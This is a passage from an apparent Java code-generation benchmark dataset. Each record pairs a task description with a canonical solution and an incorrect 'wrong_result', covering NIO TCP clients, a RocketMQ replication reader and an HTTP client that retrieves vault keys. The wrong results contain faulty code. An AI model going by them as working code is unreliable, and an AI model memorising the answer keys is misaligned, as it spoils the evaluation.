    "wrong_result": "```java\nimport java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPConnection extends AbstractConnection implements PacketSource {\n    public static final int MTU = 16384;\n    public static final int MAX_PAYLOAD_SIZE = MTU - 20 - 20; // Assuming IPv4 and TCP headers\n    private StreamBuffer clientToNetwork;\n    private Packetizer networkToClient;\n    private IPv4Packet packetForClient;\n    private SocketChannel channel;\n    private SelectionKey selectionKey;\n    private int interests;\n\n    public TCPConnection(ConnectionId id, Client client, Selector selector, IPv4Header ipv4Header, TCPHeader tcpHeader) {\n        super(id, client, ipv4Header, tcpHeader);\n        this.clientToNetwork = new StreamBuffer();\n        this.networkToClient = new Packetizer();\n        this.packetForClient = new IPv4Packet();\n        this.channel = createChannel();\n        try {\n            this.channel.configureBlocking(false);\n            this.selectionKey = this.channel.register(selector, SelectionKey.OP_CONNECT);\n            this.interests = SelectionKey.OP_CONNECT;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void disconnect() {\n        try {\n            if (channel != null && channel.isOpen()) {\n                channel.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        releaseResources();\n    }\n\n    public void processReceive() {\n        try {\n            if (channel.read(networkToClient.getBuffer()) > 0) {\n                networkToClient.process();\n                while (networkToClient.hasPacket()) {\n                    packetForClient = networkToClient.nextPacket();\n                    client.receivePacket(packetForClient);\n                }\n            }\n        } catch (IOException e) {\n            disconnect();\n        }\n    }\n\n    public void processSend() {\n        try {\n            if (clientToNetwork.hasData()) {\n                channel.write(clientToNetwork.getBuffer());\n                if (!clientToNetwork.hasData()) {\n                    updateInterests();\n                }\n            }\n        } catch (IOException e) {\n            disconnect();\n        }\n    }\n\n    private SocketChannel createChannel() {\n        try {\n            return SocketChannel.open();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void sendToNetwork(IPv4Packet packet) {\n        clientToNetwork.add(packet.getData());\n        updateInterests();\n    }\n\n    private void updateInterests() {\n        int newInterests = 0;\n        if (mayRead()) {\n            newInterests |= SelectionKey.OP_READ;\n        }\n        if (mayWrite()) {\n            newInterests |= SelectionKey.OP_WRITE;\n        }\n        if (mayConnect()) {\n            newInterests |= SelectionKey.OP_CONNECT;\n        }\n        if (newInterests != interests) {\n            selectionKey.interestOps(newInterests);\n            interests = newInterests;\n        }\n    }\n\n    private boolean mayRead() {\n        return !clientToNetwork.hasData() && networkToClient.hasSpace();\n    }\n\n    private boolean mayWrite() {\n        return clientToNetwork.hasData();\n    }\n\n    private boolean mayConnect() {\n        return channel.isConnected() && !channel.isConnectionPending();\n    }\n}\n```"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) to send messages to a server. The client should support multiple sender threads, track total bytes and messages sent, and allow for both direct and heap byte buffers.\n\nClass Description: NioClientTest is a TCP client implementation that uses Java NIO's SocketChannel to communicate with a server. It manages multiple sender threads, tracks performance metrics, and provides interactive control via console input.\n\nAttributes:\n- running: boolean - Flag to control the main loop's execution\n- total_bytes_sent: LongAdder - Counter for total bytes sent to the server\n- total_msgs: LongAdder - Counter for total messages sent to the server\n- senders: Sender[] - Array of sender threads\n\nMethods:\n- create(int size, boolean direct) -> ByteBuffer - Creates a new ByteBuffer with specified size and type (direct or heap)\n- start(InetAddress host, boolean direct, int num_threads) -> void - Main method to start the client and handle user input\n- sendMessages(InetAddress host, boolean direct, int num_threads) -> void - Creates and starts sender threads\n- Sender(InetAddress host, boolean direct, CountDownLatch latch) -> void - Constructor for the inner Sender class\n- run() -> void - The Sender thread's main execution method (connects to server and sends data)\n\nInner Class: Sender extends Thread\nAttributes:\n- ch: SocketChannel - The channel used for communication\n- latch: CountDownLatch - Synchronization aid for thread coordination\n- host: InetAddress - The server's host address\n- direct: boolean - Flag for buffer type (direct or heap)\n- buf: ByteBuffer - The buffer used for message data\n\nMethods:\n- run() -> void - Connects to server, waits for latch, then sends messages until byte limit is reached",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.LongAdder;\n\npublic class NioClientTest {\n    protected volatile boolean running=true;\n    protected final LongAdder total_bytes_sent=new LongAdder();\n    protected final LongAdder total_msgs=new LongAdder();\n    protected Sender[] senders;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(InetAddress host, boolean direct, int num_threads) throws Exception {\n        boolean looping=true;\n        while(looping) {\n            int c=Util.keyPress(\"[1] send [x] exit\");\n            switch(c) {\n                case '1':\n                    sendMessages(host, direct, num_threads);\n                    break;\n                case 'x':\n                case -1:\n                    looping=false;\n                    break;\n            }\n        }\n    }\n\n    protected void sendMessages(InetAddress host, boolean direct, int num_threads) throws Exception {\n        total_msgs.reset();\n        total_bytes_sent.reset();\n        senders=new Sender[num_threads];\n        final CountDownLatch latch=new CountDownLatch(1);\n        for(int i=0; i < senders.length; i++)\n            senders[i]=new Sender(host, direct, latch);\n        for(Sender sender: senders)\n            sender.start();\n        latch.countDown();\n        for(Sender sender: senders)\n            sender.join();\n    }\n\n    protected class Sender extends Thread {\n        protected SocketChannel ch;\n        protected final CountDownLatch latch;\n        protected final InetAddress host;\n        protected final boolean direct;\n        protected final ByteBuffer buf;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) {\n            this.latch=latch;\n            this.host=host;\n            this.direct=direct;\n            buf=create(NioServerPerfTest.SIZE, direct);\n        }\n\n        public void run() {\n            try {\n                ch=SocketChannel.open();\n                ch.configureBlocking(true);\n                ch.connect(new InetSocketAddress(host, 7500));\n                latch.await();\n            }\n            catch(Exception e) {\n                e.printStackTrace();\n            }\n            for(;;) {\n                total_bytes_sent.add(NioServerPerfTest.SIZE);\n                if(total_bytes_sent.sum() > NioServerPerfTest.BYTES_TO_SEND)\n                    break;\n                buf.rewind();\n                try {\n                    ch.write(buf);\n                    total_msgs.increment();\n                }\n                catch(IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(ch);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class NioClientTest {\n    private volatile boolean running = true;\n    private final LongAdder total_bytes_sent = new LongAdder();\n    private final LongAdder total_msgs = new LongAdder();\n    private Sender[] senders;\n\n    public ByteBuffer create(int size, boolean direct) {\n        return direct ? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    public void start(InetAddress host, boolean direct, int num_threads) {\n        sendMessages(host, direct, num_threads);\n        System.out.println(\"Enter 'stop' to exit.\");\n        try {\n            while (running) {\n                String input = new java.util.Scanner(System.in).nextLine();\n                if (\"stop\".equals(input)) {\n                    running = false;\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessages(InetAddress host, boolean direct, int num_threads) {\n        senders = new Sender[num_threads];\n        CountDownLatch latch = new CountDownLatch(num_threads);\n        for (int i = 0; i < num_threads; i++) {\n            senders[i] = new Sender(host, direct, latch);\n            senders[i].start();\n        }\n        try {\n            latch.await();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class Sender extends Thread {\n        private final SocketChannel ch;\n        private final CountDownLatch latch;\n        private final InetAddress host;\n        private final boolean direct;\n        private final ByteBuffer buf;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) throws IOException {\n            this.host = host;\n            this.direct = direct;\n            this.latch = latch;\n            this.ch = SocketChannel.open();\n            this.buf = create(1024, direct);\n        }\n\n        @Override\n        public void run() {\n            try {\n                ch.connect(host);\n                latch.countDown();\n                while (running) {\n                    if (ch.finishConnect()) {\n                        buf.clear();\n                        buf.put(\"Hello from client!\".getBytes());\n                        buf.flip();\n                        ch.write(buf);\n                        total_bytes_sent.add(buf.limit());\n                        total_msgs.increment();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    ch.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 429,
    "Instruction": "Task Description: Implement a Java class that handles reading data from a SocketChannel using Java NIO (Non-blocking I/O) for high-availability (HA) communication in a distributed messaging system.\n\nClass Description: ReadSocketService is a service thread that continuously reads data from a SocketChannel using a Selector and ByteBuffer. It processes incoming HA protocol messages (handshake and transfer states) and manages connection state. The class integrates with a high-availability service to maintain synchronization between master and slave nodes.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Constant defining the maximum buffer size for reading (1MB)\n- selector: [Selector] - NIO Selector for monitoring the SocketChannel\n- socketChannel: [SocketChannel] - The channel for communication with the remote peer\n- byteBufferRead: [ByteBuffer] - Buffer for storing read data\n- haReader: [AbstractHAReader] - Reader implementation for processing HA protocol messages\n- processPosition: [int] - Current processing position within the read buffer\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n\nMethods:\n- ReadSocketService([SocketChannel socketChannel]) -> [void] - Constructor that initializes the selector, configures the socket channel, and sets up the HA reader\n- run() -> [void] - Main service loop that performs selector operations, reads data, and handles connection state\n- getServiceName() -> [String] - Returns the service name with broker identifier if in container mode\n- HAServerReader.processReadResult([ByteBuffer byteBufferRead]) -> [boolean] - Processes the read buffer according to HA protocol (handshake and transfer states), returns true if processing succeeds\n\nThe class should handle connection timeouts, buffer management (including compaction), and proper resource cleanup when stopping. It should integrate with a parent HA connection service for state management and notification.",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.ha.io.AbstractHAReader;\nimport org.apache.rocketmq.store.ha.io.HAWriter;\n\nclass ReadSocketService extends ServiceThread {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024;\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private final AbstractHAReader haReader;\n    private int processPosition = 0;\n    private volatile long lastReadTimestamp = System.currentTimeMillis();\n\n    public ReadSocketService(final SocketChannel socketChannel) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.socketChannel = socketChannel;\n        this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n        this.setDaemon(true);\n        haReader = new HAServerReader();\n        haReader.registerHook(readSize -> {\n            if (readSize > 0) {\n                ReadSocketService.this.lastReadTimestamp =\n                    haService.getDefaultMessageStore().getSystemClock().now();\n            }\n        });\n    }\n\n    @Override\n    public void run() {\n        LOGGER.info(this.getServiceName() + \" service started\");\n\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                boolean ok = this.haReader.read(this.socketChannel, this.byteBufferRead);\n                if (!ok) {\n                    AutoSwitchHAConnection.LOGGER.error(\"processReadEvent error\");\n                    break;\n                }\n\n                long interval = haService.getDefaultMessageStore().getSystemClock().now() - this.lastReadTimestamp;\n                if (interval > haService.getDefaultMessageStore().getMessageStoreConfig().getHaHousekeepingInterval()) {\n                    LOGGER.warn(\"ha housekeeping, found this connection[\" + clientAddress + \"] expired, \" + interval);\n                    break;\n                }\n            } catch (Exception e) {\n                AutoSwitchHAConnection.LOGGER.error(this.getServiceName() + \" service has exception.\", e);\n                break;\n            }\n        }\n\n        this.makeStop();\n\n        changeCurrentState(HAConnectionState.SHUTDOWN);\n\n        writeSocketService.makeStop();\n\n        haService.removeConnection(AutoSwitchHAConnection.this);\n\n        haService.getConnectionCount().decrementAndGet();\n\n        SelectionKey sk = this.socketChannel.keyFor(this.selector);\n        if (sk != null) {\n            sk.cancel();\n        }\n\n        try {\n            this.selector.close();\n            this.socketChannel.close();\n        } catch (IOException e) {\n            AutoSwitchHAConnection.LOGGER.error(\"\", e);\n        }\n\n        flowMonitor.shutdown(true);\n\n        AutoSwitchHAConnection.LOGGER.info(this.getServiceName() + \" service end\");\n    }\n\n    @Override\n    public String getServiceName() {\n        if (haService.getDefaultMessageStore().getBrokerConfig().isInBrokerContainer()) {\n            return haService.getDefaultMessageStore().getBrokerIdentity().getIdentifier() + ReadSocketService.class.getSimpleName();\n        }\n        return ReadSocketService.class.getSimpleName();\n    }\n\n    class HAServerReader extends AbstractHAReader {\n        @Override\n        protected boolean processReadResult(ByteBuffer byteBufferRead) {\n            while (true) {\n                boolean processSuccess = true;\n                int readSocketPos = byteBufferRead.position();\n                int diff = byteBufferRead.position() - ReadSocketService.this.processPosition;\n                if (diff >= AutoSwitchHAClient.MIN_HEADER_SIZE) {\n                    int readPosition = ReadSocketService.this.processPosition;\n                    HAConnectionState slaveState = HAConnectionState.values()[byteBufferRead.getInt(readPosition)];\n\n                    switch (slaveState) {\n                        case HANDSHAKE:\n                            Long slaveBrokerId = byteBufferRead.getLong(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 8);\n                            AutoSwitchHAConnection.this.slaveId = slaveBrokerId;\n                            short syncFromLastFileFlag = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 12);\n                            if (syncFromLastFileFlag == 1) {\n                                AutoSwitchHAConnection.this.isSyncFromLastFile = true;\n                            }\n                            short isAsyncLearner = byteBufferRead.getShort(readPosition + AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE - 10);\n                            if (isAsyncLearner == 1) {\n                                AutoSwitchHAConnection.this.isAsyncLearner = true;\n                            }\n\n                            isSlaveSendHandshake = true;\n                            byteBufferRead.position(readSocketPos);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.HANDSHAKE_HEADER_SIZE;\n                            LOGGER.info(\"Receive slave handshake, slaveBrokerId:{}, isSyncFromLastFile:{}, isAsyncLearner:{}\",\n                                AutoSwitchHAConnection.this.slaveId, AutoSwitchHAConnection.this.isSyncFromLastFile, AutoSwitchHAConnection.this.isAsyncLearner);\n                            break;\n                        case TRANSFER:\n                            long slaveMaxOffset = byteBufferRead.getLong(readPosition + 4);\n                            ReadSocketService.this.processPosition += AutoSwitchHAClient.TRANSFER_HEADER_SIZE;\n\n                            AutoSwitchHAConnection.this.slaveAckOffset = slaveMaxOffset;\n                            if (slaveRequestOffset < 0) {\n                                slaveRequestOffset = slaveMaxOffset;\n                            }\n                            byteBufferRead.position(readSocketPos);\n                            maybeExpandInSyncStateSet(slaveMaxOffset);\n                            AutoSwitchHAConnection.this.haService.updateConfirmOffsetWhenSlaveAck(AutoSwitchHAConnection.this.slaveId);\n                            AutoSwitchHAConnection.this.haService.notifyTransferSome(AutoSwitchHAConnection.this.slaveAckOffset);\n                            break;\n                        default:\n                            LOGGER.error(\"Current state illegal {}\", currentState);\n                            return false;\n                    }\n\n                    if (!slaveState.equals(currentState)) {\n                        LOGGER.warn(\"Master change state from {} to {}\", currentState, slaveState);\n                        changeCurrentState(slaveState);\n                    }\n                    if (processSuccess) {\n                        continue;\n                    }\n                }\n\n                if (!byteBufferRead.hasRemaining()) {\n                    byteBufferRead.position(ReadSocketService.this.processPosition);\n                    byteBufferRead.compact();\n                    ReadSocketService.this.processPosition = 0;\n                }\n                break;\n            }\n\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class ReadSocketService implements Runnable {\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024; // 1MB\n    private final Selector selector;\n    private final SocketChannel socketChannel;\n    private final ByteBuffer byteBufferRead;\n    private final AbstractHAReader haReader;\n    private int processPosition;\n    private long lastReadTimestamp;\n\n    public ReadSocketService(SocketChannel socketChannel) throws IOException {\n        this.selector = Selector.open();\n        this.socketChannel = socketChannel;\n        this.socketChannel.configureBlocking(false);\n        this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n        this.byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        this.haReader = new HAServerReader();\n        this.processPosition = 0;\n        this.lastReadTimestamp = System.currentTimeMillis();\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                int readyChannels = selector.select(1000);\n                if (readyChannels > 0) {\n                    Set<SelectionKey> selectedKeys = selector.selectedKeys();\n                    Iterator<SelectionKey> keyIterator = selectedKeys.iterator();\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isReadable()) {\n                            readData(key);\n                        }\n                        keyIterator.remove();\n                    }\n                } else {\n                    checkTimeout();\n                }\n            }\n        } catch (IOException e) {\n            handleIOException(e);\n        } finally {\n            cleanup();\n        }\n    }\n\n    private void readData(SelectionKey key) throws IOException {\n        SocketChannel channel = (SocketChannel) key.channel();\n        byteBufferRead.clear();\n        int bytesRead = channel.read(byteBufferRead);\n        if (bytesRead == -1) {\n            closeConnection();\n            return;\n        }\n        byteBufferRead.flip();\n        boolean processed = haReader.processReadResult(byteBufferRead);\n        if (processed) {\n            processPosition = byteBufferRead.position();\n            byteBufferRead.compact();\n            lastReadTimestamp = System.currentTimeMillis();\n        } else {\n            byteBufferRead.clear();\n        }\n    }\n\n    private void checkTimeout() {\n        if (System.currentTimeMillis() - lastReadTimestamp > 30000) { // 30 seconds\n            closeConnection();\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            socketChannel.close();\n            selector.close();\n        } catch (IOException e) {\n            // Handle close exception\n        }\n    }\n\n    private void handleIOException(IOException e) {\n        // Handle I/O exception\n    }\n\n    private void cleanup() {\n        try {\n            if (selector != null && !selector.isOpen()) {\n                selector.close();\n            }\n            if (socketChannel != null && !socketChannel.isOpen()) {\n                socketChannel.close();\n            }\n        } catch (IOException e) {\n            // Handle cleanup exception\n        }\n    }\n\n    public String getServiceName() {\n        // Implementation based on container mode and broker identifier\n        return \"ReadSocketService\";\n    }\n}"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for interacting with a hub API, handling authentication, and processing various API responses to retrieve encryption keys.\n\nClass Description: The HubHttpClient class provides functionality to communicate with a hub API, manage authentication using bearer tokens, and handle different API response scenarios to retrieve encryption keys. It supports both modern and legacy API versions.\n\nAttributes:\n\nhttpClient: [HttpClient] - The HTTP client instance used for making requests\nbearerToken: [String] - The bearer token used for authentication\nhubConfig: [HubConfig] - Configuration containing API URIs\ndeviceId: [String] - Identifier for the device making requests\nvaultId: [String] - Identifier for the vault being accessed\n\nMethods:\n\nconstructor: [HubHttpClient]([ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId]) -> [void] - Initializes the HTTP client with configuration and authentication details\nrequestApiConfig: [requestApiConfig]() -> [CompletableFuture<ReceivedKey>] - Initiates the API configuration request chain\nhandleApiConfigResponse: [handleApiConfigResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the API configuration response\nrequestDeviceData: [requestDeviceData]() -> [CompletableFuture<ReceivedKey>] - Requests device-specific data from the API\nhandleDeviceDataResponse: [handleDeviceDataResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the device data response\nrequestVaultMasterkey: [requestVaultMasterkey]([String encryptedUserKey]) -> [CompletableFuture<ReceivedKey>] - Requests the vault master key\nhandleVaultMasterkeyResponse: [handleVaultMasterkeyResponse]([String encryptedUserKey, HttpResponse<String> response]) -> [ReceivedKey] - Processes the vault master key response\nrequestLegacyAccessToken: [requestLegacyAccessToken]() -> [CompletableFuture<ReceivedKey>] - Requests a legacy access token\nhandleLegacyAccessTokenResponse: [handleLegacyAccessTokenResponse]([HttpResponse<String> response]) -> [ReceivedKey] - Processes the legacy access token response\nretrievalFailed: [retrievalFailed]([Throwable cause]) -> [ReceivedKey] - Handles request failures",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.common.base.Preconditions;\nimport com.nimbusds.jose.JWEObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.text.ParseException;\nimport java.time.Duration;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(HubHttpClient.class);\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final Duration REQ_TIMEOUT = Duration.ofSeconds(10);\n\n\tprivate final HttpClient httpClient;\n\tprivate final String bearerToken;\n\tprivate final HubConfig hubConfig;\n\tprivate final String deviceId;\n\tprivate final String vaultId;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken);\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.vaultId = vaultId;\n\t}\n\n\tpublic CompletableFuture<ReceivedKey> requestApiConfig() {\n\t\tvar configUri = hubConfig.URIs.API.resolve(\"config\");\n\t\tvar request = HttpRequest.newBuilder(configUri)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenCompose(this::handleApiConfigResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tPreconditions.checkState(response.statusCode() == 200, \"Unexpected response \" + response.statusCode());\n\t\ttry {\n\t\t\tvar config = JSON.reader().readValue(response.body(), ConfigDto.class);\n\t\t\tif (config.apiLevel >= 1) {\n\t\t\t\treturn requestDeviceData();\n\t\t\t} else {\n\t\t\t\treturn requestLegacyAccessToken();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestDeviceData() {\n\t\tvar deviceUri = hubConfig.URIs.API.resolve(\"devices/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8))\n\t\t\t\t.thenCompose(this::handleDeviceDataResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\ttry {\n\t\t\tswitch (response.statusCode()) {\n\t\t\t\tcase 200 -> {\n\t\t\t\t\tvar device = JSON.reader().readValue(response.body(), DeviceDto.class);\n\t\t\t\t\treturn requestVaultMasterkey(device.userPrivateKey);\n\t\t\t\t}\n\t\t\t\tdefault -> throw new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n\t\tvar vaultKeyUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/access-token\");\n\t\tvar request = HttpRequest.newBuilder(vaultKeyUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(response -> handleVaultMasterkeyResponse(encryptedUserKey, response))\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tif (response.statusCode() == 200) {\n\t\t\ttry {\n\t\t\t\tvar vaultKeyJwe = JWEObject.parse(response.body());\n\t\t\t\tvar userKeyJwe = JWEObject.parse(encryptedUserKey);\n\t\t\t\treturn ReceivedKey.vaultKeyAndUserKey(vaultKeyJwe, userKeyJwe);\n\t\t\t} catch (ParseException e) {\n\t\t\t\tthrow new RuntimeException(e);\n\t\t\t}\n\t\t} else {\n\t\t\tthrow new IllegalStateException(\"Unexpected response \" + response.statusCode());\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n\t\tvar legacyAccessTokenUri = hubConfig.URIs.API.resolve(\"vaults/\" + vaultId + \"/keys/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(legacyAccessTokenUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenApply(this::handleLegacyAccessTokenResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n\t\ttry {\n\t\t\tif (response.statusCode() == 200) {\n\t\t\t\tvar token = JWEObject.parse(response.body());\n\t\t\t\treturn ReceivedKey.legacyDeviceKey(token);\n\t\t\t} else {\n\t\t\t\tthrow new IOException(\"Unexpected response \" + response.statusCode());\n\t\t\t}\n\t\t} catch (IOException | ParseException e) {\n\t\t\tthrow new UncheckedIOException(e instanceof IOException ? (IOException) e : new IOException(e));\n\t\t}\n\t}\n\n\tprivate ReceivedKey retrievalFailed(Throwable cause) {\n\t\tthrow new RuntimeException(cause);\n\t}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record DeviceDto(@JsonProperty(value = \"userPrivateKey\", required = true) String userPrivateKey) {}\n\n\t@JsonIgnoreProperties(ignoreUnknown = true)\n\tprivate record ConfigDto(@JsonProperty(value = \"apiLevel\") int apiLevel) {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n    private final HttpClient httpClient;\n    private final String bearerToken;\n    private final HubConfig hubConfig;\n    private final String deviceId;\n    private final String vaultId;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n        this.httpClient = HttpClient.newHttpClient();\n        this.bearerToken = bearerToken;\n        this.hubConfig = hubConfig;\n        this.deviceId = deviceId;\n        this.vaultId = vaultId;\n    }\n\n    public CompletableFuture<ReceivedKey> requestApiConfig() {\n        return CompletableFuture.supplyAsync(() -> {\n            try {\n                HttpRequest request = HttpRequest.newBuilder()\n                        .uri(URI.create(hubConfig.getApiConfigUri()))\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .header(\"X-Device-ID\", deviceId)\n                        .GET()\n                        .build();\n                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n                return handleApiConfigResponse(response);\n            } catch (Exception e) {\n                return retrievalFailed(e);\n            }\n        });\n    }\n\n    private CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            // Process API config response and return ReceivedKey\n            return CompletableFuture.completedFuture(new ReceivedKey(\"api_config_key\"));\n        } else {\n            return CompletableFuture.failedFuture(new RuntimeException(\"API config request failed with status: \" + response.statusCode()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestDeviceData() {\n        return CompletableFuture.supplyAsync(() -> {\n            try {\n                HttpRequest request = HttpRequest.newBuilder()\n                        .uri(URI.create(hubConfig.getDeviceDataUri()))\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .header(\"X-Device-ID\", deviceId)\n                        .GET()\n                        .build();\n                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n                return handleDeviceDataResponse(response);\n            } catch (Exception e) {\n                return retrievalFailed(e);\n            }\n        });\n    }\n\n    private CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n      